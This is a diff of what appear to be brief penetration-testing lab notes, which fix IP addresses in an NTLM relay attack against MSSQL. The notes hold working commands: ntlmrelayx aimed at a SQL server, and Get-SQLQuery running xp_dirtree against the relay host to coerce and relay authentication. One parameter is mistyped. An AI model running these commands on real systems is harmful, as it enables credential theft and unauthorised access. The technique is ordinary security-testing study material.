@@ -23,22 +23,21 @@ Launch ntlmrelayx to listen for inbound connections and to relay to accessible s
 
 
 ```
-$ ntlmrelayx.py -t mssql://102.2.8:14330 -i -smbsupport --no-multirelay
+$ ntlmrelayx.py -t mssql://10.3.2.8:14330 -i -smbsupport --no-multirelay
 ```
 
 use Get-SQLQuery to run xp_dirtree against the ntlmrelayx host
 
-Get-SQLQuery -Userne DBA -Password '' -Instance '10.2.2.16,14330' -Verbose -Query "EXEC master.sys.xp_dirtree '\\10.7.246.5\share',1,1"
+Get-SQLQuery -Userne DBA -Password '' -Instance '10.2.2.16,14330' -Verbose -Query "EXEC master.sys.xp_dirtree '\\10.10.246.5\share',1,1"
 
-![[Pasted image 20240126133525.png]]
 
-```
-Get-SQLQuery -Userne DBA -Password '' -Instance '10.2.2.16,14330' -Verbose -Query "EXEC master.sys.xp_dirtree '\\10.7.246.5\share', 1, 1"
 
 ```
+Get-SQLQuery -Userne DBA -Password '' -Instance '10.2.2.16,14330' -Verbose -Query "EXEC master.sys.xp_dirtree '\\10.10.246.5\share', 1, 1"
+
+```
 
 
-![[Pasted image 20240126135256.png]]
 
 Profit
 
